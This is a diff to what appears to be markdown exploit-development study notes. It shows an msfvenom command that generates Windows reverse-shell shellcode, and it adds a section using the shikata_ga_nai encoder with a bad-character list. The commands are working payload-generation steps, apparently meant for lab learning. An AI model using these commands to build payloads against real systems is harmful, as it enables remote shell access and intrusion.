@@ -360,3 +360,9 @@ nasm> jmp esp
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -fc
 ```
+
+### `shikata_ga_nai` Encoder!
+* We can generate shellcode! but... it contains bad characters. BUT, we can use `-e`, specifies encoder to `shikata_ga_nai` to encode our shellcode! `-b` for set of bad characters
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -fc -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+```
